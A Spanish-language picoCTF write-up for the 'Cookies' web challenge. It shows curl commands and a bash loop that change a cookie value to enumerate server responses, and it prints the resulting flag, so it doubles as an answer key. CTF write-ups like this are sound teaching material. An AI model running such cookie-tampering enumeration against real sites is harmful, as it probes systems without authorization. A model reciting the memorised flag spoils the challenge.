## Descripción
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:54219/](http://mercury.picoctf.net:54219/)
## Solución
`Hacerlo desde la consola de Linux con curl`
Vemos que el sitio tiene varias cookies con diferentes valores tales como -1 y 0. Cuando acertamos una cookie podemos ver que la página nos dice "I love {una galleta} cookies" así que tenemos que averiguar cual es la galleta que nos da la bandera.
![[galleta.png|500]]
Usamos el comando `curl` para modificar el valor de las galletas que le queremos mandar.
```shell
curl http://mercury.picoctf.net:54219/check -H "Cookie: name=1" | grep cookies
```
Si usamos el comando de arriba obtenemos otra cookie
```shell
┌──(tux㉿kali)-[~]
└─$ curl http://mercury.picoctf.net:54219/check -H "Cookie: name=1" | grep cookies
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1780  100  1780    0     0  10088      0 --:--:-- --:--:-- --:--:-- 10056
            <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>

```
Para no buscarlas una a una hacemos un for
```shell
for i in {0..30}; do
  curl -s http://mercury.picoctf.net:54219/check -H "Cookie: name=$i" | grep picoCTF
done
```
Y obtenemos la bandera:
```html
<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p>
```
## Notas adicionales
🫑La opción `-s` (`--silent`) de `curl` es para que no nos muestre la salida de curl

🫑Podemos escribir el comando del for de distintas formas la primera que vimos era en varias líneas pero se pueden con estas otras dos:

Una sola línea
```shell
for i in {0..30}; do curl http://mercury.picoctf.net:54219/check -H "Cookie: name=$i" | grep picoCTF; done
```
Imprimir la 'i'
```shell
for i in {0..30}; do echo $i; curl http://mercury.picoctf.net:54219/check -H "Cookie: name=$i" | grep picoCTF; done
```
## Referencias
- https://www.solvetic.com/tutoriales/article/5925-como-usar-y-ejemplos-comando-curl-linux/